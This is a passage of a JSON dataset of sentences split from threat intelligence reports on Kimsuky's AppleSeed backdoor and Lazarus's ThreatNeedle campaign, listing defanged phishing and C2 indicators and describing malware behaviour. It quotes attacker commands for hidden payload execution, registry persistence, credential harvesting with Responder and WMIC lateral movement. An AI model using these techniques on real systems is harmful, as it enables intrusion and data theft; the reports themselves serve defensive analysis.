        "id": "cti_reports_filtered/r-742.md:::S87",
        "text": "https://accounts[.]grnail-signing[.]work",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S88",
        "text": "/v2",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S89",
        "text": "https://myaccount[.]grnail-signing[.]work",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S90",
        "text": "/v2",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S91",
        "text": "https://myaccount[.]grnail-security[.]work",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S92",
        "text": "/v2",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S93",
        "text": "https://signin[.]grnail",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S94",
        "text": "-",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S95",
        "text": "login[.]ml",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S96",
        "text": "https://login[.]gmail",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S97",
        "text": "-",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S98",
        "text": "account[.]gq",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S99",
        "text": "https://signin[.]gmrail[.]ml",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S100",
        "text": "https://login[.]gmeil[.]kro[.]kr",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S101",
        "text": "https://account[.]googgle[.]kro[.]kr",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S102",
        "text": "The group has used Twitter accounts to find and monitor its targets to prepare well crafted spear phishing emails.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S103",
        "text": "The group also is using Gmail accounts to use for phishing attacks or registering domains.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S104",
        "text": "One of the Gmail accounts used by this actor is \" tjkim1991@gmail[.]com\" which was used to register the following sub-domains:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S105",
        "text": "ns1.microsoft-office[.]us",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S106",
        "text": "ns2.microsoft-office[.]us",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S107",
        "text": "They were registered on April 3 and we believe have been reserved to be used for future campaigns.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S108",
        "text": "Pivoting from these sub-domains, we were able to uncover the infrastructure used by this actor.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S109",
        "text": "Some of it has overlap with previously reported campaigns operated by Kimsuky.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S110",
        "text": "Figure 3: Infrastructure pivoting",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S111",
        "text": "Command and Control infrastructure",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S112",
        "text": "Kimsuky reuses some of its phishing infrastructure for its command and control communications.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S113",
        "text": "In their most recent attack against South Korea's government they reused the infrastructure that has been used to host their phishing websites for AppleSeed backdoor C&C communications.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S114",
        "text": "Besides using the AppleSeed backdoor to target Windows users, the actor also has used an Android backdoor to target Android users.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S115",
        "text": "The Android backdoor can be considered as the mobile variant of the AppleSeed backdoor.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S116",
        "text": "It uses the same command patterns as the Windows one.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S117",
        "text": "Also, both Android and Windows backdoors have used the same infrastructure.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S118",
        "text": "It is also interesting to mention that this actor calls themselves Thallium.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S119",
        "text": "Figure 4: C2 infrastructure\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S120",
        "text": "Here are some of IPs and domains used by the actor for C2 communications:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S121",
        "text": "210.16.120[.]34 216.189.157[.]89 45.58.55[.]73 45.13.135[.]103 27.102.114[.]89 210.16.121[.]137 58.229.208[.]146 27.102.107[.]63 download.riseknite[.]life onedrive-upload.ikpoo[.]cf alps.travelmountain[.]ml texts.letterpaper[.]press",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S122",
        "text": "Analysis of the most recent AppleSeed attack",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S123",
        "text": "In this section we provide an analysis of the AppleSeed backdoor that has been used to target the Ministry of the Foreign Affairs of South Korea.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S124",
        "text": "The actor has distributed its dropper embedded in an archive file (\uc678\uad50\ubd80 \uac00\ud310 2021-05-07.zip) as an attachment through spearphishing emails.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S125",
        "text": "The target email addresses have been collected using the actor email phishing campaigns we described in the previous section.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S126",
        "text": "The actor conducted this spearphishing attack on May 7, 2021.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S127",
        "text": "The archive file contains a JavaScript file (\uc678\uad50\ubd80 \uac00\ud310 2021-05-07.pdf.jse) which pretends to be a PDF file that contains two Base64 encoded blobs.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S128",
        "text": "The first one is the content of the decoy PDF file in Base64 format and the other one contains the AppleSeed payload also in Base64 format (encoded twice).\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S129",
        "text": "At first it uses the MSXML Base64 decoding functionality to decode the first layer and then uses certutil.exe to decode the second layer and get the final ApppleSeed payload.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S130",
        "text": "The decoy PDF file has been decoded using the MSXML Base64 decoding function.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S131",
        "text": "After decoding the PDF and AppleSeed payload, the content gets written into the ProgramData directory.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S132",
        "text": "At the end, the decoy PDF file is opened by calling Wscript.Shell.Run and the AppleSeed payload executed through PowerShell by calling regsvr32.exe.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S133",
        "text": "Calling regsvr32.exe to run a DLL registers it as a server that automatically calls the DLL export function that has been named DllRegisterServer.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S134",
        "text": "powershell.exe -windowstyle hidden regsvr32.exe /s AppleSeed_Payload",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S135",
        "text": "Wscript_Shell.Run(Pdf_Name);",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S136",
        "text": "The dropped payload is a DLL file that has been packed using the UPX packer.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S137",
        "text": "The unpacked sample is highly obfuscated and important API calls and strings have been encrypted using a custom encryption algorithm.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S138",
        "text": "The encrypted version of the strings and API calls are in hex ASCII format.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S139",
        "text": "Whenever in the code the malware needs to use a string, it takes the encrypted string and passes it into two functions to decrypt it.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S140",
        "text": "The first function \"string_decryptor_prep\" gets the encrypted string and then prepares a custom data structure that has four elements:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S141",
        "text": "The second function \"string_decryptor\" gets the created data structure in the previous function and then decrypts the string and puts it in the same data structure.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S142",
        "text": "The decryptor function first convert the input string in hex ascii format to binary by calling the hexascii_to_binary function on each two ascii characters (i.e. c3, 42, b1, 1d... in example 1).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S143",
        "text": "The first 16 bytes of in the input is then used as the key and the remainder is the actual value that gets decrypted in 16 byte chunks (i.e. ed, d5, 0d, 60).\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S144",
        "text": "Decryption is a simple xor operation of key[i] ^ string[i-1] ^ string[i] (For the first character string_to_be_decrypted[i-1] is set to zero).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S145",
        "text": "Most of the important API calls resolve dynamically during the run time using \"string_decryptor\" function.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S146",
        "text": "(288 API calls have been resolved dynamically.)",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S147",
        "text": "The AppleSeed payload has an export function named \"DllRegisterServer\" which will be called when the DLL is executed using RegSvr32.exe.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S148",
        "text": "DllRegisterServer has a function that is responsible for performing the DLL initialization and setup that includes the following steps:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S149",
        "text": "Copy itself into \"C:\\ProgramData\\Software\\ESTsoft\\Common\" and rename itself as ESTCommon.dll to pretend it is a DLL that belongs to ESTsecurity company.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S150",
        "text": "and rename itself as to pretend it is a DLL that belongs to ESTsecurity company.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S151",
        "text": "Make itself persistent by creating the following registry key:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S152",
        "text": "Registry key name: EstsoftAutoUpdate Registry key value: Regsvr32.exe /s C:\\ProgramData\\Software\\ESTsoft\\Common\\ESTCommon.dll Registry location: HKLU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S153",
        "text": "Functionality activation by creating the following files into \"C:\\ProgramData\\Software\\ESTsoft\\Common\\flags\" directory and writes \"flag\" into them: FolderMonitor, KeyboardMonitor, ScreenMonitor, UsbMonitor.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S154",
        "text": "In the next step it creates a Mutex to make sure it only infects a victim once.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S155",
        "text": "After creating that mutex, it checks if the current process has the right access privilege by calling GetTokenInformation API call and if it does not have the right privilege, it tries to escalate its privilege using AdjustTokenPrivilege by passing SeDebugPrivilege to it to gain system level privilege.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S156",
        "text": "At the end it performs its main functionalities in separate threads.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S157",
        "text": "All the the collected data in each thread is being zipped and encrypted and is being sent to the command and control server using HTTP POST requests in a separate thread.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S158",
        "text": "After sending the data to the server, the data is deleted from the victim's machine.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S159",
        "text": "The ApppleSeed payload is using RC4 for encryption and decryption of the data.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S160",
        "text": "To generate RC4 key, it creates a Random buffer of 117 bytes by Calling CryptGenRandom and then uses CryptCreateHash and CryptHashData to adds the buffer into a MD5 hash object.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S161",
        "text": "Then it calls CryptDeriveKey to generate the RC4 key.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S162",
        "text": "The created 117 bytes buffer is encrypted using RSA algorithm and is sent to the sever along with RC4 encrypted data.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S163",
        "text": "The RSA key is in hex ASCII format and has been decrypted using \"string_decryptor\" function.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S164",
        "text": "The keylogger function uses GetKeyState and GetKeyboardState to capture the pressed keys on the victim's machine and logs all keys per process into the log.txt file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S165",
        "text": "This module takes screenshots by calling the following sequence of API calls and writes them to files: GetDesktopWindow, GetDC, CreateCompstibleDC, CreateCompatibleBitmap, Bitblt and GetDIBits and then writes them into a file using CreateFileW and WriteFile.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S166",
        "text": "This module finds the removable media devices connected to the machine and collects its data before sending it to the command and control server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S167",
        "text": "To identify a USB drive it calls CM_Get_Device_IDW to retrieve the device instance ID that would be in format \" <device-ID>\\<instance-specific-ID> \" and then checks if it contains USB string value.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S168",
        "text": "This thread looks for txt, ppt, hwp, pdf, and doc files in the Desktop, Documents, Downloads and AppData\\Local\\Microsoft\\Windows\\INetCache\\IE directories and archives them to be ready to be exfiltrated to the server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S0",
        "text": "In this attack, spear phishing was used as the initial infection vector.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S1",
        "text": "Before launching the attack, the group studied publicly available information about the targeted organization and identified email addresses belonging to various departments of the company.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S2",
        "text": "Email addresses in those departments received phishing emails that either had a malicious Word document attached or a link to one hosted on a remote server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S3",
        "text": "The phishing emails claimed to have urgent updates on today\u2019s hottest topic \u2013 COVID-19 infections.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S4",
        "text": "The phishing emails were carefully crafted and written on behalf of a medical center that is part of the organization under attack.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S5",
        "text": "The attackers registered accounts with a public email service, making sure the sender\u2019s email addresses looked similar to the medical center\u2019s real email address.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S6",
        "text": "The signature shown in the phishing emails included the actual personal data of the deputy head doctor of the attacked organization\u2019s medical center.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S7",
        "text": "The attackers were able to find this information on the medical center\u2019s public website.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S8",
        "text": "A macro in the Microsoft Word document contained the malicious code designed to download and execute additional malicious software on the infected system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S9",
        "text": "The document contains information on the population health assessment program and is not directly related to the subject of the phishing email (COVID-19), suggesting the attackers may not completely understand the meaning of the contents they used.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S10",
        "text": "The content of the lure document was copied from an online post by a health clinic.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S11",
        "text": "Our investigation showed that the initial spear-phishing attempt was unsuccessful due to macros being disabled in the Microsoft Office installation of the targeted systems.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S12",
        "text": "In order to persuade the target to allow the malicious macro, the attacker sent another email showing how to enable macros in Microsoft Office.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S13",
        "text": "After sending the above email with explanations, the attackers realized that the target was using a different version of Microsoft Office and therefore required a different procedure for enabling macros.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S14",
        "text": "The attackers subsequently sent another email showing the correct procedure in a screenshot with a Russian language pack.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S15",
        "text": "The content in the spear-phishing emails sent by the attackers from May 21 to May 26, 2020, did not contain any grammatical mistakes.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S16",
        "text": "However, in subsequent emails the attackers made numerous errors, suggesting they may not be native Russian speakers and were using translation tools.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S17",
        "text": "On June 3, 2020, one of the malicious attachments was opened by employees and at 9:30 am local time the attackers gained remote control of the infected system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S18",
        "text": "This group also utilized different types of spear-phishing attack.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S19",
        "text": "One of the compromised hosts received several spear-phishing documents on May 19, 2020.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S20",
        "text": "The malicious file that was delivered, named Boeing_AERO_GS.docx, fetches a template from a remote server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S21",
        "text": "However, no payload created by this malicious document could be discovered.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S22",
        "text": "We speculate that the infection from this malicious document failed for a reason unknown to us.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S23",
        "text": "A few days later, the same host opened a different malicious document.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S24",
        "text": "The threat actor wiped these files from disk after the initial infection meaning they could not be obtained.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S25",
        "text": "Nonetheless, a related malicious document with this malware was retrieved based on our telemetry.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S26",
        "text": "It creates a payload and shortcut file and then continues executing the payload by using the following command line parameters.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S27",
        "text": "- Payload path: %APPDATA%\\Microsoft\\Windows\\lconcaches.db\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S28",
        "text": "- Shortcut path: %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrives.lnk\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S29",
        "text": "- Command Line; please note that the string at the end is hard-coded, but different for each sample:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S30",
        "text": "- exe [dllpath],Dispatch n2UmQ9McxUds2b29",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S31",
        "text": "The content of the decoy document depicts the job description of a generator/power industry engineer.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S32",
        "text": "Upon opening a malicious document and allowing the macro, the malware is dropped and proceeds to a multistage deployment procedure.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S33",
        "text": "The malware used in this campaign belongs to a known malware cluster we named ThreatNeedle.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S34",
        "text": "We attribute this malware family to the advanced version of Manuscrypt (a.k.a. NukeSped), a family belonging to the Lazarus group.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S35",
        "text": "We previously observed the Lazarus group utilizing this cluster when attacking cryptocurrency businesses and a mobile game company.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S36",
        "text": "Although the malware involved and the entire infection process is known and has not changed dramatically compared to previous findings, the Lazarus group continued using ThreatNeedle malware aggressively in this campaign.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S37",
        "text": "The payload created by the initial spear-phishing document loads the next stage as a backdoor running in-memory \u2013 the ThreatNeedle backdoor.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S38",
        "text": "ThreatNeedle offers functionality to control infected victims.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S39",
        "text": "The actor uses it to carry out initial reconnaissance and deploy additional malware for lateral movement.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S40",
        "text": "When moving laterally, the actor uses ThreatNeedle installer-type malware in the process.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S41",
        "text": "This installer is responsible for implanting the next stage loader-type malware and registering it for auto-execution in order to achieve persistence.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S42",
        "text": "The ThreatNeedle loader-type malware exists in several variations and serves the primary purpose of loading the final stage of the ThreatNeedle malware in-memory.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S43",
        "text": "Upon launch, the malware decrypts an embedded string using RC4 (key: B6 B7 2D 8C 6B 5F 14 DF B1 38 A1 73 89 C1 D2 C4) and compares it to \u201c7486513879852\u201c.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S44",
        "text": "If the user executes this malware without a command line parameter, the malware launches a legitimate calculator carrying a dark icon of the popular Avengers franchise.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S45",
        "text": "Further into the infection process, the malware chooses a service name randomly from netsvc in order to use it for the payload creation path.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S46",
        "text": "The malware then creates a file named bcdbootinfo.tlp in the system folder containing the infection time and the random service name that is chosen.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S47",
        "text": "We\u2019ve discovered that the malware operator checks this file to see whether the remote host was infected and, if so, when the infection happened.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S48",
        "text": "It then decrypts the embedded payload using the RC4 algorithm, saves it to an .xml extension with a randomly created five-character file name in the current directory and then copies it to the system folder with a .sys extension.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S49",
        "text": "This final payload is the ThreatNeedle loader running in memory.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S50",
        "text": "At this point the loader uses a different RC4 key (3D 68 D0 0A B1 0E C6 AF DD EE 18 8E F4 A1 D6 20), and the dropped malware is registered as a Windows service and launched.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S51",
        "text": "In addition, the malware saves the configuration data as a registry key encrypted in RC4:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S52",
        "text": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\GameConfig \u2013 Description",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S53",
        "text": "This component is responsible for loading the final backdoor payload into memory.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S54",
        "text": "In order to do this, the malware uses several techniques to decrypt its payload:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S55",
        "text": "- Loading the payload from the registry.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S56",
        "text": "- Loading the payload from itself after decrypting RC4 and decompression.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S57",
        "text": "- Loading the payload from itself after decrypting AES and decompression.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S58",
        "text": "- Loading the payload from itself after decompression.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S59",
        "text": "- Loading the payload from itself after one-byte XORing.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S60",
        "text": "Most loader-style malware types check the command line parameter and only proceed with the malicious routine if an expected parameter is given.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S61",
        "text": "This is a common trait in ThreatNeedle loaders.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S62",
        "text": "The most common example we\u2019ve seen is similar to the ThreatNeedle installer \u2013 the malware decrypts an embedded string using RC4, and compares it with the parameter \u201cSx6BrUk4v4rqBFBV\u201d upon launch.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S63",
        "text": "If it matches, the malware begins decrypting its embedded payload using the same RC4 key.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S64",
        "text": "The decrypted payload is an archive file which is subsequently decompressed in the process.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S65",
        "text": "Eventually, the ThreatNeedle malware spawns in memory.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S66",
        "text": "The other variant of the loader is preparing the next stage payload from the victim\u2019s registry.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S67",
        "text": "As we can see from the installer malware description, we suspect that the registry key was created by the installer component.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S68",
        "text": "Retrieved data from the registry is decrypted using RC4 and then decompressed.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S69",
        "text": "Eventually, it gets loaded into memory and the export function is invoked.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S70",
        "text": "The final payload executed in memory is the actual ThreatNeedle backdoor.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S71",
        "text": "It has the following functionality to control infected victim machines:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S72",
        "text": "- Manipulate files/directories",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S73",
        "text": "- System profiling",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S74",
        "text": "- Control backdoor processes",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S75",
        "text": "- Enter sleeping or hibernation mode\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S76",
        "text": "- Update backdoor configuration",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S77",
        "text": "- Execute received commands",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S78",
        "text": "From one of the hosts, we discovered that the actor executed a credential harvesting tool named Responder and moved laterally using Windows commands.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S79",
        "text": "Lazarus overcame network segmentation, exfiltrating data from a completely isolated network segment cut off from the internet by compromising a router virtual machine, as we explain below under \u201cOvercoming network segmentation\u201c.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S80",
        "text": "Judging by the hosts that were infected with the ThreatNeedle backdoors post-exploitation, we speculate that the primary intention of this attack is to steal intellectual property.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S81",
        "text": "Lastly, the stolen data gets exfiltrated using a custom tool that will be described in the \u201cExfiltration\u201d section.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S82",
        "text": "Below is a rough timeline of the compromise we investigated:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S83",
        "text": "During the investigation we discovered that the Responder tool was executed from one of the victim machines that had received the spear-phishing document.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S84",
        "text": "One day after the initial infection, the malware operator placed the tool onto this host and executed it using the following command:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S85",
        "text": "[Responder file path] -i [IP address] -rPv",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S86",
        "text": "Several days later, the attacker started to move laterally originating from this host.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S87",
        "text": "Therefore, we assess that the attacker succeeded in acquiring login credentials from this host and started using them for further malicious activity.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S88",
        "text": "After acquiring the login credentials, the actor started to move laterally from workstations to server hosts.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S89",
        "text": "Typical lateral movement methods were employed, using Windows commands.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S90",
        "text": "First, a network connection with a remote host was established using the command \u201cnet use\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S91",
        "text": "net use \\\\[IP address]\\IPC$ \u201c[password]\u201d /u:\u201d[user name]\u201d > $temp\\~tmp5936t.tmp 2>&1\u2033\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S92",
        "text": "Next, the actor copied malware to the remote host using the Windows Management Instrumentation Command-line (WMIC).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S93",
        "text": "- exe /node:[IP address] /user:\u201d[user name]\u201d",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S94",
        "text": "/password:\u201d[password]\u201d PROCESS CALL CREATE \u201c cmd.exe /c $appdata\\Adobe\\adobe.bat \u201c\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S95",
        "text": "- \u201c exe /node:[IP address] /user:\u201d[user name]\u201d /password:\u201d[password]\u201d PROCESS",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S96",
        "text": "CALL CREATE \u201ccmd /c sc queryex helpsvc > $temp\\tmp001.dat",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S97",
        "text": "\u201c\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S98",
        "text": "In the course of this research, we identified another highly interesting technique used by the attackers for lateral movement and exfiltration of stolen data.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S99",
        "text": "The enterprise network under attack was divided into two segments: corporate (a network on which computers had internet access) and restricted (a network on which computers hosted sensitive data and had no internet access).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S100",
